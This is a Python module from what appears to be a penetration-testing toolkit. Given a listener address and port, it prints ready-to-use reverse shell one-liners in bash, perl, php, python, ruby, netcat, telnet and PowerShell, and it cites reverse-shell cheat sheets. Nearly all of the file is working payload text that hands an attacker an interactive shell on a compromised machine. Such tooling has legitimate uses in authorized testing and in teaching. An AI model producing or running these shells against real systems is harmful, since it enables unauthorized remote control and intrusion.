"""
Reverse Shells

Print out various reverse shells based on the set option(s)

"""


class Module:
    """
    Module Class
    """

    __title__ = 'payload.rsh'
    __date__ = '2017-12-05'
    __rank__ = 'normal'
    __description__ = 'Print out various versions of one-line reverse shells'
    __details__ = 'None'

    __author__ = 'Intrukit'

    def __init__(self, LANG='bash', LHOST=None, LPORT=4444):
        """
        __init__(self, LANG='bash', LHOST=None, LPORT=4444)

        :param LANG: 
        :param LHOST:
        :param LPORT:

        Initialize the module with the module's desired options
        """
        self.__dict__['LANG'] = {"value": LANG, "required": True, "description":
            "bash, perl, php, python, ruby, netcat, telnet"}
        self.__dict__['LHOST'] = {"value": LHOST, "required": True, "description": "Local listening host"}
        self.__dict__['LPORT'] = {"value": LPORT, "required": True, "description": "Local listening port"}


    def run(self):
        """
        run(self)

        :return: 

        Run the module
        """
        if self.LANG['value'] and self.LHOST['value'] and self.LPORT['value']:
            print("\n")
            if self.LANG['value'] == 'bash':
                print("bash -i >& /dev/tcp/{}/{} 0>&1".format(self.LHOST['value'], self.LPORT['value']))

            elif self.LANG['value'] == 'perl':
                print("{}{}{}".format("perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,".format(
                    self.LHOST['value'], self.LPORT['value']),
                      "getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");",
                      "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))

            elif self.LANG['value'] == 'php':
                print("php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(
                self.LHOST['value'], self.LPORT['value']))

            elif self.LANG['value'] == 'python':
                print("{}{}{}".format("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);",
                      "s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); ".format(
                    self.LHOST['value'], self.LPORT['value']),
                      "os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"))

            elif self.LANG['value'] == 'ruby':
                print("{}{}".format("ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;".format(self.LHOST['value'],
                self.LPORT['value']),
                      "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"))

            elif self.LANG['value'] == 'netcat':
                print("nc -e /bin/sh {} {}".format(self.LHOST['value'], self.LPORT['value']))
                print("/bin/sh | nc {} {}".format(self.LHOST['value'], self.LPORT['value']))
                print("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(self.LHOST['value'],
                                                                                                   self.LPORT['value']))

            elif self.LANG['value'] == 'telnet':
                print("rm -f /tmp/p; mknod /tmp/p p && telnet {} {} 0/tmp/p".format(self.LHOST['value'], self.LPORT['value']))
                print("telnet 10.0.0.1 4443 | /bin/bash | telnet {} {}".format(self.LHOST['value'], self.LPORT['value']))
            elif self.LANG['value'] == 'powershell':
                print('{}{}'.format(
                    '$client = New-Object System.Net.Sockets.TCPClient("{}",{});'.format(self.LHOST['value'],
                                                                                         self.LPORT['value']),
                    '$stream = $client.GetStream();[byte[]]'
                    '$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = '
                    '(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = '
                    '(iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = '
                    '([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);'
                    '$stream.Flush()};$client.Close()'))

            print("\nReferences: ")
            print("http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet")
            print("http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html")
            print("https://github.com/samratashok/nishang/tree/master/Shells")
            print("\n")
        else:
            print("You are missing required module options. Please see: show options")

